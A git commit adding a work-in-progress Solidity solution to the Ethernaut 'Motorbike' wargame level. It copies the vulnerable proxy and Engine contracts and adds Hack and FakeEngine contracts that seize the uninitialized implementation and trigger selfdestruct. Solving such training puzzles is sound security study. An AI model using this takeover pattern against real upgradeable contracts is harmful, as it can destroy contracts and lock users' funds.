a776e68ab8132ce6b4b592362bc7a0515b6b0dd4
Abhishek  Taneja <abhishek.taneja@soundcloud.com>
2022-08-17 18:09:03 +0200

    motorbile solution WIP

---
+++ hacks/24-Motorbike.sol
@@ -0,0 +1,181 @@
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.16;
+
+import "../node_modules/hardhat-console/contracts/console.sol";
+import "@openzeppelin/contracts/proxy/utils/Initializable.sol";
+
+/**
+Ethernaut's motorbike has a brand new upgradeable engine design.
+
+Would you be able to selfdestruct its engine and make the motorbike unusable ?
+
+Things that might help:
+
+EIP-1967
+UUPS upgradeable pattern
+Initializable contract
+
+**/
+contract Motorbike {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+    
+    struct AddressSlot {
+        address value;
+    }
+    
+    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
+    constructor(address _logic) {
+        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
+        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
+        (bool success,) = _logic.delegatecall(
+            abi.encodeWithSignature("initialize()")
+        );
+        require(success, "Call failed");
+    }
+
+    // Delegates the current call to `implementation`.
+    function _delegate(address implementation) internal virtual {
+        // solhint-disable-next-line no-inline-assembly
+        assembly {
+            calldatacopy(0, 0, calldatasize())
+            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
+            returndatacopy(0, 0, returndatasize())
+            switch result
+            case 0 { revert(0, returndatasize()) }
+            default { return(0, returndatasize()) }
+        }
+    }
+
+    // Fallback function that delegates calls to the address returned by `_implementation()`. 
+    // Will run if no other function in the contract matches the call data
+    fallback () external payable virtual {
+        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
+    }
+
+    function getEngineAddress() public view returns(address) {
+      return _getAddressSlot(_IMPLEMENTATION_SLOT).value;
+    }
+
+    // Returns an `AddressSlot` with member `value` located at `slot`.
+    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
+        assembly {
+            r.slot := slot
+        }
+    }
+}
+
+contract Engine is Initializable {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    address public upgrader;
+    uint256 public horsePower;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    function initialize() external initializer {
+        horsePower = 1000;
+        upgrader = msg.sender;
+    }
+
+    // Upgrade the implementation of the proxy to `newImplementation`
+    // subsequently execute the function call
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
+        _authorizeUpgrade();
+        _upgradeToAndCall(newImplementation, data);
+    }
+
+    // Restrict to upgrader role
+    function _authorizeUpgrade() internal view {
+        require(msg.sender == upgrader, "Can't upgrade");
+    }
+
+    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
+    function _upgradeToAndCall(
+        address newImplementation,
+        bytes memory data
+    ) internal {
+        // Initial upgrade and setup call
+        _setImplementation(newImplementation);
+        if (data.length > 0) {
+            (bool success,) = newImplementation.delegatecall(data);
+            require(success, "Call failed");
+        }
+    }
+
+    function getEngineAddress() public view returns(address) {
+      AddressSlot storage r;
+        assembly {
+            r.slot := _IMPLEMENTATION_SLOT
+        }
+        return r.value;
+    }
+    
+    // Stores a new address in the EIP1967 implementation slot.
+    function _setImplementation(address newImplementation) private {
+        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
+        
+        AddressSlot storage r;
+        assembly {
+            r.slot := _IMPLEMENTATION_SLOT
+        }
+        r.value = newImplementation;
+    }
+}
+
+
+interface EngineI {
+  function initialize() external;
+  function upgradeToAndCall(address newImplementation, bytes memory data) external payable ;
+}
+
+
+contract Hack {
+
+  address fakeEngine;
+  EngineI engine;
+
+  // Get the address from the storage slot
+ // await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
+  constructor(address _engine, address _fakeEngine){
+    engine = EngineI(_engine);
+    fakeEngine = _fakeEngine;
+  }
+
+  function getTestCallData() public pure returns(bytes memory) {
+    return abi.encodeWithSignature("horsePower()");
+  }
+
+  function getTestCallData1() public pure returns(bytes memory) {
+    return abi.encodeWithSignature("horsePowerUnknown()");
+  }
+  
+
+  function hack() public {
+    engine.initialize();
+    engine.upgradeToAndCall(fakeEngine, abi.encodePacked(""));
+  }
+
+  function destroy() public {
+    (bool result, ) = address(engine).call(abi.encodeWithSignature("destroy()"));
+    require(result, "Engine was not destroyed");
+  }
+
+  function destroyFake() public {
+    (bool result, ) = fakeEngine.call(abi.encodeWithSignature("destroy()"));
+    require(result, "Engine was not destroyed");
+  }
+}
+
+
+contract FakeEngine is Initializable  {
+
+  function destroy() public {
+    selfdestruct(payable(address(msg.sender)));
+  }
+}
